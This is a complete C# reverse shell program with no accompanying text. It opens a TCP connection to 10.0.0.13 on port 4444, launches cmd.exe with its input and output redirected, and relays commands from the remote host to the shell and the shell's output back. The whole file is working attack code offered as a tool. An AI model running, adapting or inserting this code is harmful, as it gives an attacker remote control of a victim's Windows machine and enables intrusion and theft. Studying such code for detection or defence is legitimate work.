// C# reverse shell
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

class Revshell {
    static void Main() {
        using var client = new TcpClient("10.0.0.13", 4444);
        using var stream = client.GetStream();
        byte[] buf = new byte[4096];
        int i;
        var p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/q";
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.UseShellExecute = false;
        p.OutputDataReceived += (s, e) => {
            if (e.Data != null) {
                var b = Encoding.ASCII.GetBytes(e.Data + "\n");
                stream.Write(b, 0, b.Length);
            }
        };
        p.Start();
        p.BeginOutputReadLine();
        while ((i = stream.Read(buf, 0, buf.Length)) != 0) {
            string cmd = Encoding.ASCII.GetString(buf, 0, i);
            p.StandardInput.WriteLine(cmd);
        }
    }
}
